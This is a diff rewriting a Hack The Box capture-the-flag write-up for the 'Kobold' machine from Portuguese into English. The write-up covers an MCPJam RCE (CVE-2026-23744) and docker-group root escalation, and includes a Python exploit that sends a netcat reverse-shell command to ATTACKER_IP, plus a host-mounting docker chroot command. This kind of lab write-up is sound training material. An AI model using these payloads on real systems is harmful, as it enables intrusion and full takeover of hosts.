@@ -1,313 +1,148 @@
-# Hack The Box — Kobold
+## Summary
 
-![HTB](https://img.shields.io/badge/Platform-Hack%20The%20Box-green)
-![Difficulty](https://img.shields.io/badge/Difficulty-Easy-blue)
-![OS](https://img.shields.io/badge/OS-Linux-orange)
-![Category](https://img.shields.io/badge/Category-Web%20%2B%20Privesc-red)
+Kobold is an Easy Linux machine where virtual host fuzzing reveals an
+**MCPJam** instance vulnerable to remote code execution (CVE-2026-23744). The
+RCE provides a shell as `ben`. The initial shell does not inherit all of the
+user's groups; running with `sg docker` reveals membership in the **docker**
+group, which is abused to mount the host filesystem and escalate to **root**.
 
----
+## Machine Information
 
-# Informações da Máquina
+| Name | Difficulty | OS | Platform |
+| --- | --- | --- | --- |
+| Kobold | Easy | Linux | Hack The Box |
 
-| Nome   | Dificuldade | Plataforma   | OS    |
-| ------ | ----------- | ------------ | ----- |
-| Kobold | Easy        | Hack The Box | Linux |
+## Attack Path
 
----
+1. Service enumeration with Nmap.
+2. Subdomain/vhost discovery with Gobuster.
+3. An MCPJam application is identified.
+4. RCE is exploited (CVE-2026-23744).
+5. Initial access is obtained as `ben`.
+6. Privilege escalation via the docker group.
 
-# Superfície de ataque
+## Reconnaissance
 
-```
-1. Enumeração de serviços (Nmap)
-2. Descoberta de subdomínios (Gobuster)
-3. Identificação de aplicação MCPJam
-4. Exploração de RCE (CVE-2026-23744)
-5. Acesso inicial como usuário ben
-6. Escalação de privilégio via Docker group
-```
-
----
-
-# Reconhecimento
-
-A enumeração inicial foi realizada com Nmap:
+Initial enumeration was performed with **Nmap**.
 
 ```bash
 nmap -sC -sV -A -T4 10.129.23.43
 ```
 
-![Nmap Scan](screenshots/nmap.png)
+| Port | Service | Notes |
+| --- | --- | --- |
+| 22 | SSH | OpenSSH 9.6p1 |
+| 80 | HTTP | Redirects to HTTPS |
+| 443 | HTTPS | nginx + virtual hosts |
 
-### Descobertas
+## Web Enumeration
 
-| Porta | Serviço | Observações            |
-| ----- | ------- | ---------------------- |
-| 22    | SSH     | OpenSSH 9.6p1          |
-| 80    | HTTP    | Redireciona para HTTPS |
-| 443   | HTTPS   | nginx + virtual hosts  |
-
----
-
-# Enumeração Web
-
-A aplicação principal redirecionava para HTTPS.
-Foi realizado fuzzing de subdomínios:
+The main application redirected to HTTPS, so virtual host fuzzing was performed.
 
 ```bash
 gobuster vhost -u https://kobold.htb \
--w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
--k --append-domain
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt \
+  -k --append-domain
 ```
 
-![Gobuster](screenshots/gobuster.png)
+Two subdomains were found:
 
-### Subdomínios encontrados:
+- `mcp.kobold.htb` — an **MCPJam** application
+- `bin.kobold.htb` — a **PrivateBin** instance (encrypted pastes, not directly exploitable)
 
-* `mcp.kobold.htb`
-* `bin.kobold.htb`
+## Exploitation — MCPJam RCE (CVE-2026-23744)
 
----
-
-## Análise dos subdomínios
-
-### MCP (`mcp.kobold.htb`)
-
-Aplicação MCPJam:
-
-![MCPJam](screenshots/mcp.png)
-
----
-
-### PrivateBin (`bin.kobold.htb`)
-
-Aplicação PrivateBin:
-
-![PrivateBin](screenshots/bin.png)
-
-Serviço de paste criptografado (não explorável diretamente).
-
----
-
-# Exploração
-
-Foi identificada a vulnerabilidade:
-
-> **CVE-2026-23744 — MCPJam RCE**
-
-Essa vulnerabilidade permite execução de comandos arbitrários através do endpoint:
-
-```text
-/api/mcp/connect
-```
-
----
-
-## Exploit utilizado
+MCPJam is vulnerable to arbitrary command execution through the
+`/api/mcp/connect` endpoint, which accepts an attacker-controlled server
+configuration.
 
 ```python
 import requests
-import json
 
 target = "https://TARGET"
 ip = "ATTACKER_IP"
 port = "ATTACKER_PORT"
 
-url = f'{target}/api/mcp/connect'
-
+url = f"{target}/api/mcp/connect"
 data = {
     "serverConfig": {
         "command": "busybox",
-        "args": [
-            "nc",
-            f"{ip}",
-            f"{port}",
-            "-e",
-            "/bin/bash"
-        ],
-        "env": {}
+        "args": ["nc", ip, port, "-e", "/bin/bash"],
+        "env": {},
     },
-    "serverId": "213j1l3jkljkl3j"
+    "serverId": "213j1l3jkljkl3j",
 }
 
 response = requests.post(url, json=data, verify=False)
-
 print(response.status_code)
 print(response.text)
 ```
 
----
+## Initial Access (User)
 
-# Acesso Inicial
-
-Listener:
+A listener was prepared and the exploit fired, returning a reverse shell as
+`ben`.
 
 ```bash
 nc -lvnp 1337
 ```
 
-Execução do exploit → reverse shell obtida.
+The user flag lives at `/home/ben/user.txt`.
 
-![Shell](screenshots/shell.png)
+## Privilege Escalation
 
-```bash
-whoami
-ben
-```
+### Enumeration
 
----
-
-# Flag de Usuário
-
-```bash
-cat /home/ben/user.txt
-```
-
-![User Flag](screenshots/user-flag.png)
-
-```
-0616ed.....................
-```
-
----
-
-# Escalação de Privilégio
-
-Enumeração inicial não revelou vetores diretos:
-
-```bash
-sudo -l
-find / -perm -4000
-getcap -r /
-```
-
----
-
-## Descoberta importante
-
-O acesso inicial foi obtido via processo que não herdava todos os grupos.
-
-Executando:
+Standard checks (`sudo -l`, SUID, capabilities) revealed no direct vector. The
+key insight was that the initial shell did not inherit all of the user's
+groups. Forcing the docker group revealed the real membership:
 
 ```bash
 sg docker -c "id"
 ```
 
-Resultado:
-
-```bash
+```
 uid=1001(ben) gid=111(docker) groups=111(docker),37(operator),1001(ben)
 ```
 
----
+### Abusing the docker group
 
-## Vulnerabilidade
-
-> Usuário com acesso ao grupo `docker`
-
-### Impacto:
-
-* Execução de containers
-* Montagem do filesystem host
-* Acesso root completo
-
----
-
-# Explorando a Escalação de Privilégio
-
-Listando imagens disponíveis:
+Membership in the `docker` group is equivalent to root: a container can mount
+the host filesystem and `chroot` into it.
 
 ```bash
 sg docker -c "docker images"
-```
-
-Imagem encontrada:
-
-```
-mysql
-```
-
----
-
-## Exploit
-
-```bash
 sg docker -c "docker run --rm -v /:/mnt -it mysql chroot /mnt sh"
 ```
 
----
-
-# Root shell obtida
-
-![Root Shell](screenshots/root-shell.png)
-
-```bash
-id
+```
 uid=0(root) gid=0(root)
 ```
 
----
+The root flag lives at `/root/root.txt`.
 
-# Flag Root
+## Vulnerability Analysis
 
-```bash
-cat /root/root.txt
-```
+**MCPJam RCE (CVE-2026-23744)** — the `/api/mcp/connect` endpoint executed
+commands from an attacker-controlled server configuration, giving
+unauthenticated RCE. Fix: upgrade MCPJam, never execute user-supplied command
+fields, and authenticate the endpoint.
 
-![Root Flag](screenshots/root-flag.png)
+**Docker group privilege escalation** — members of the `docker` group can run
+containers that bind-mount the host filesystem, which is equivalent to root.
+Fix: treat docker group membership as root, restrict it to trusted accounts, and
+use rootless Docker or fine-grained authorization where possible.
 
-```
-c264bb.....................
-```
+## Tools Used
 
----
+- Nmap
+- Gobuster
+- Netcat
+- Python (requests)
 
-# Vulnerabilidades Identificadas
+## Key Takeaways
 
-### CVE-2026-23744 — MCPJam RCE
-
-**Descrição:**
-Permite execução de comandos arbitrários via configuração manipulada no endpoint `/api/mcp/connect`.
-
-**Impacto:**
-
-* Remote Code Execution
-* Shell remota
-
----
-
-### Docker Group Privilege Escalation
-
-**Descrição:**
-Usuários no grupo docker podem executar containers com acesso ao filesystem do host.
-
-**Impacto:**
-
-* Escalação para root
-* Controle total do sistema
-
----
-
-# Ferramentas Utilizadas
-
-* Nmap
-* Gobuster
-* ffuf
-* Netcat
-* Burp Suite
-* Python (requests)
-
----
-
-# Principais Aprendizados
-
-* Enumeração de subdomínios é essencial
-* APIs podem esconder RCE críticas
-* Nem toda shell herda permissões completas
-* Docker group = root
-* Sempre verificar grupos com `id` e `sg`
-
----
-
-# Autor
-
-https://github.com/ninjaa-exe
+- Subdomain/vhost enumeration is essential to find the real attack surface.
+- APIs can hide critical RCE behind innocuous-looking endpoints.
+- Not every shell inherits full group membership; verify with `id` and `sg`.
+- Membership in the docker group is effectively root.
